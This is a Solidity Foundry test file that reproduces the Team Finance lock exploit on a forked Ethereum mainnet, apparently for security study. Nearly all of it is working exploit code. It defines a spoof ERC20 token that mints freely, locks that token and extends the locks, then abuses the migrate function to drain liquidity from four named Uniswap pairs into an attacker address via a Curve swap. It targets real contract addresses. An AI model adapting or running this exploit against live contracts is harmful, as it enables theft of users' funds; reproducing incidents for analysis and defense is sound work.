// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";
import {IUniswapV2Pair} from "../../utils/IUniswapV2Pair.sol";
import {ICurve} from "../../utils/ICurve.sol";

contract SpoofERC20 {
    string constant name = "";
    uint256 constant decimals = 18;
    string constant symbol = "";

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    event Approval(address, address, uint256);
    event Transfer(address, address, uint256);

    function approve(address spender, uint256 amount) public {
        require(spender != address(0));

        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(to != address(0));
        require(balanceOf[to] <= ~amount);

        balanceOf[to] += amount; // Essentially, mints tokens.

        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(to != address(0));
        require(balanceOf[to] <= ~amount);

        balanceOf[to] += amount;

        emit Transfer(from, to, amount);
        return true;
    }
}

interface IV3Migrator {
    struct MigrateParams {
        address pair; // the Uniswap v2-compatible pair
        uint256 liquidityToMigrate; // expected to be balanceOf(msg.sender)
        uint8 percentageToMigrate; // represented as a numerator over 100
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Min; // must be discounted by percentageToMigrate
        uint256 amount1Min; // must be discounted by percentageToMigrate
        address recipient;
        uint256 deadline;
        bool refundAsETH;
    }
}

interface ITeamFinanceLock {
    function lockToken(
        address _tokenAddress,
        address _withdrawalAddress,
        uint256 _amount,
        uint256 _unlockTime,
        bool _mintNFT
    ) external payable returns (uint256 _id);
    function getFeesInETH(address _tokenAddress) external returns (uint256);

    function extendLockDuration(uint256 _id, uint256 _unlockTime) external;

    function migrate(
        uint256 _id,
        IV3Migrator.MigrateParams calldata params,
        bool noLiquidity,
        uint160 sqrtPriceX96,
        bool _mintNFT
    ) external payable;
}

contract Exploit_TeamFinance is TestHarness, TokenBalanceTracker {
    ITeamFinanceLock internal teamFinanceLock = ITeamFinanceLock(0xE2fE530C047f2d85298b07D9333C05737f1435fB);
    address internal lockTokenImplementation = 0x48D118C9185e4dBAFE7f3813F8F29EC8a6248359;

    IWETH9 internal weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 internal usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 internal dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 internal caw = IERC20(0xf3b9569F82B18aEf890De263B84189bd33EBe452);
    IERC20 internal tsuka = IERC20(0xc5fB36dd2fb59d3B98dEfF88425a3F425Ee469eD);

    IUniswapV2Pair internal fegPair = IUniswapV2Pair(0x854373387E41371Ac6E307A1F29603c6Fa10D872);
    IUniswapV2Pair internal usdcCawPair = IUniswapV2Pair(0x7a809081f991eCfe0aB2727C7E90D2Ad7c2E411E);
    IUniswapV2Pair internal usdcTsukaPair = IUniswapV2Pair(0x67CeA36eEB36Ace126A3Ca6E21405258130CF33C);
    IUniswapV2Pair internal kndxPair = IUniswapV2Pair(0x9267C29e4f517cE9f6d603a15B50Aa47cE32278D);

    ICurve internal curveStablesPool = ICurve(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);

    uint256[] internal tokenIds;
    IERC20[4] internal migrationTokens0;
    IERC20[4] internal migrationTokens1;
    IUniswapV2Pair[4] internal pairs;

    SpoofERC20 internal maliciousToken;
    address internal attackerAddress_Two = address(0x912);

    bool internal afterCallingLockToken;
    bool internal valuesPushedToArrays;

    uint256 internal constant LOCKED_AMOUNT = 1_000_000_000;
    uint256 internal constant TRANSFER_AMOUNT = LOCKED_AMOUNT * 10e28;

    uint160 internal constant newPriceX96 = 79_210_883_607_084_793_911_461_085_816;
    // equal tick: -5,
    // equal price: 0.999563867
    // Source:
    // https://github.com/stakewithus/notes/blob/main/notebook/uniswap-v3/tick-and-sqrt-price-x-96.ipynb

    function setUp() external {
        cheat.createSelectFork(vm.envString("RPC_URL"), 15_837_165);
        cheat.deal(address(this), 0.5 ether);

        maliciousToken = new SpoofERC20();

        _pushValuesToArrays();
        _labelAccounts();
        _tokenTrackerSetup();

        updateBalanceTracker(address(this));
        updateBalanceTracker(address(teamFinanceLock));
        updateBalanceTracker(attackerAddress_Two);
    }

    function test_attack() external {
        console.log('"\n===== FIRST PART: LOCK SPOOF TOKENS =====');
        _logAllBalances();

        this.lockTransferAndExtend{value: 0.5 ether}();

        console.log('"\n===== SECOND PART: ATTACK TEAM LOCK =====');
        _logAllBalances();
        coordinateAttack();

        console.log("\n ===== AFTER ATTACK =====");
        _logAllBalances();
    }

    // ====================================== FIRST TRANSACTION (LOCK) LOGIC
    // ======================================
    function lockTransferAndExtend() external payable {
        // Locks four times.
        for (uint256 i = 0; i < 4;) {
            // First step differs from the others.
            if (i == 0) {
                _lockTokenInTeam(msg.value);
                maliciousToken.transfer(lockTokenImplementation, TRANSFER_AMOUNT); // Malicious token supply
                    // manipulation.
            } else {
                _lockTokenInTeam(address(this).balance);
            }
            unchecked {
                ++i;
            }
        }

        // Extends the duration of each lock in four separate txns.
        _extendLockDurations();
    }

    function _lockTokenInTeam(uint256 _value) internal {
        afterCallingLockToken = true;
        uint256 tokenFees = teamFinanceLock.getFeesInETH(address(maliciousToken));
        require(_value > tokenFees, "Send enough ETH for fees");

        // Passing block.timestamp reverts with 'Invalid unlock time'.
        // The attacker passed block.timestamp + 5.
        uint256 tokenId = teamFinanceLock.lockToken{value: _value}(
            address(maliciousToken), address(this), LOCKED_AMOUNT, block.timestamp + 5, false
        );
        tokenIds.push(tokenId);

        afterCallingLockToken = false;
    }

    function _extendLockDurations() internal {
        uint256 amountOfIds = tokenIds.length;
        for (uint256 i = 0; i < amountOfIds;) {
            teamFinanceLock.extendLockDuration(tokenIds[i], block.timestamp + 5 + 40_000);

            unchecked {
                ++i;
            }
        }
    }

    // ====================================== END OF FIRST TRANSACTION LOGIC
    // ========================================
    receive() external payable {
        if (afterCallingLockToken) {
            console.log("Received %s ETH refund after locking token", address(this).balance);
        }
    }

    // ====================================== SECOND TRANSACTION (ATTACK) LOGIC
    // =====================================
    // The attacker named this function SuitcaseOnGodbJiVga()
    function coordinateAttack() internal {
        uint256 _poolLiquidity;
        uint256 amountOfPairs = pairs.length;

        for (uint256 i = 0; i < amountOfPairs;) {
            _poolLiquidity = pairs[i].balanceOf(address(teamFinanceLock));

            IV3Migrator.MigrateParams memory params;

            params.pair = address(pairs[i]);
            params.liquidityToMigrate = _poolLiquidity;
            params.percentageToMigrate = 1;
            params.token0 = address(migrationTokens0[i]);
            params.token1 = address(migrationTokens1[i]);
            params.fee = 500;
            params.tickLower = -100;
            params.tickUpper = 100;
            params.amount0Min = 0;
            params.amount1Min = 0;
            params.recipient = attackerAddress_Two;
            params.deadline = block.timestamp + 500; // The attacker specified the deadline using a constant
                // offset against the current timestamp
            params.refundAsETH = true;

            teamFinanceLock.migrate(tokenIds[i], params, true, newPriceX96, false);

            _exchangeAndTransfer(tokenIds[i], migrationTokens0[i], migrationTokens1[i], pairs[i]);

            /* 
            The following step is not needed for the attack itself but it is made by the attacker. 
            This interesting approval could have many reasons such as using automated attack scripts, having 
            control of the contract's assets with an external account in case of a contingency, etc.
            */

            migrationTokens1[i].approve(attackerAddress_Two, type(uint256).max);

            unchecked {
                ++i;
            }
        }
    }

    // This function appears as guessed_f9b65204 in the traces.
    function _exchangeAndTransfer(
        uint256, /*_tokenId*/
        IERC20 _from,
        IERC20, /*_to*/
        IUniswapV2Pair /*_pair*/
    ) internal {
        if (address(_from) == address(maliciousToken)) return; // There's no logic executed when the origin is
            // the malicious token
        if (_from.balanceOf(address(this)) == 0) return; // Do nothing if there's no USDC

        _from.approve(address(curveStablesPool), type(uint256).max);

        uint256 balanceOfFrom = _from.balanceOf(address(this));

        // The attacker specifies the min_dy = 0.98 dx.
        curveStablesPool.exchange(1, 0, balanceOfFrom, balanceOfFrom * 98 / 100);

        // Then transfers the stablecoin to the external account
        dai.transfer(attackerAddress_Two, dai.balanceOf(address(this)));
    }

    // ======================================== SETUP FUNCTIONS
    // =====================================================
    function _pushValuesToArrays() internal {
        require(!valuesPushedToArrays, "values already pushed");
        valuesPushedToArrays = true;

        migrationTokens0 = [IERC20(address(maliciousToken)), usdc, usdc, IERC20(address(maliciousToken))];

        migrationTokens1 = [IERC20(address(weth)), caw, tsuka, IERC20(address(weth))];

        pairs = [fegPair, usdcCawPair, usdcTsukaPair, kndxPair];
    }

    function _labelAccounts() internal {
        cheat.label(address(weth), "WETH");
        cheat.label(address(usdc), "USDC");
        cheat.label(address(dai), "DAI");
        cheat.label(address(caw), "CAW");
        cheat.label(address(tsuka), "TSUKA");
        cheat.label(address(fegPair), "Feg Pair");
        cheat.label(address(usdcCawPair), "USDC-CAW Pair");
        cheat.label(address(usdcTsukaPair), "USDC-TSUKA Pair");
        cheat.label(address(kndxPair), "KNDX Pair");

        cheat.label(address(curveStablesPool), "Curve");

        cheat.label(address(maliciousToken), "Malicious Token");
        cheat.label(address(this), "ATTACKER CONTRACT");
        cheat.label(attackerAddress_Two, "Attacker Recipient EOA");
    }

    function _tokenTrackerSetup() internal {
        addTokenToTracker(address(weth));
        addTokenToTracker(address(usdc));
        addTokenToTracker(address(dai));
        addTokenToTracker(address(caw));
        addTokenToTracker(address(tsuka));

        updateBalanceTracker(address(this));
        updateBalanceTracker(attackerAddress_Two);
        updateBalanceTracker(address(teamFinanceLock));
    }

    function _logAllBalances() internal {
        logBalancesWithLabel("Team Finance Lock", address(teamFinanceLock));
        logBalancesWithLabel("Attacker Contract", address(this));
        logBalancesWithLabel("Attacker EOA", attackerAddress_Two);
    }
}
